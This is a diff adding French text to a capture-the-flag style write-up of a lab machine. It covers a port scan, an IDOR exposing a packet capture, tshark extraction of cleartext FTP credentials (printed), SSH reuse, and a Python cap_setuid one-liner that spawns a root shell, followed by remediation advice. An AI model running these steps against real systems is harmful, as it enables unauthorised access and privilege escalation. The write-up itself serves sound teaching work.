@@ -56,19 +56,70 @@
     </ul>
 
     <h2>Reconnaissance</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Un scan de ports complet suivi d'une détection de version sur les ports ouverts suffit pour
+      cadrer la machine.
+    </p>
+    <pre><code><span class="c"># Balayage réseau et détection de services</span>
+ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -Pn -sC -sV 10.10.10.245</code></pre>
+    <p>
+      Trois services ressortent : vsftpd 3.0.3 sur le port 21 (accès anonyme désactivé), OpenSSH
+      8.2p1 sur le port 22, et un serveur applicatif Gunicorn sur le port 80 qui héberge un
+      tableau de bord d'analyse réseau.
+    </p>
 
     <h2>Énumération</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Le site web permet de lancer des captures réseau de 5 secondes, chacune rattachée à un
+      identifiant numérique consultable via <code>/data/&lt;id&gt;</code>. Rien n'empêche de
+      revenir en arrière sur cet identifiant : c'est un IDOR (Insecure Direct Object Reference)
+      classique, où l'autorisation repose uniquement sur le fait de connaître l'URL.
+    </p>
 
     <h2>Accès initial</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      En remontant jusqu'à <code>/data/0</code>, on récupère la toute première capture
+      enregistrée au démarrage du serveur, avant même la mienne. Son ouverture dans Wireshark (ou
+      directement via <code>tshark</code>) révèle un échange FTP en clair.
+    </p>
+    <pre><code><span class="c"># Extraction des identifiants non chiffrés dans la capture réseau 0</span>
+tshark -r capture_0.pcap -Y 'ftp' -T fields -e ftp.request.command -e ftp.request.arg
+<span class="out">→ Utilisateur : nathan / Mot de passe : Buck3tH4TF0RM3!</span></code></pre>
+    <p>
+      Le mot de passe FTP est réutilisé tel quel sur SSH :
+    </p>
+    <pre><code>ssh nathan@10.10.10.245</code></pre>
 
     <h2>Élévation de privilèges</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Une fois sur la machine, LinPEAS signale une capacité Linux inhabituelle posée directement
+      sur l'interpréteur Python système. On peut vérifier ça soi-même avec <code>getcap</code> :
+    </p>
+    <pre><code><span class="c"># Audit des capacités Linux assignées aux binaires</span>
+getcap -r / 2>/dev/null
+<span class="out">→ /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span></code></pre>
+    <p>
+      <code>cap_setuid</code> permet à n'importe quel processus lancé avec ce binaire de changer
+      son UID effectif vers 0, sans avoir besoin du bit SUID classique. Python devient alors un
+      raccourci direct vers root :
+    </p>
+    <pre><code><span class="c"># Preuve de concept d'élévation vers l'UID 0 (Root)</span>
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+whoami && id
+<span class="out">→ root (uid=0(root) gid=1001(nathan) groups=1001(nathan))</span></code></pre>
 
     <h2>Ce que j'en retiens</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Deux défauts très banals, pris séparément, ne mènent nulle part. C'est leur combinaison qui
+      compromet la machine : l'IDOR n'a de valeur que parce que la capture fuite des identifiants
+      en clair, et ces identifiants n'ont de valeur que parce qu'ils sont réutilisés sur un
+      service distinct. Côté remédiation, trois points ressortent : retirer la capacité
+      <code>cap_setuid</code> de l'interpréteur Python (<code>setcap -r /usr/bin/python3.8</code>),
+      mettre un contrôle d'accès sur les routes <code>/data/&lt;id&gt;</code> pour qu'un
+      utilisateur ne puisse consulter que ses propres captures, et abandonner FTP en clair au
+      profit de SFTP ou FTPS.
+    </p>
 
   </main>
 </div>
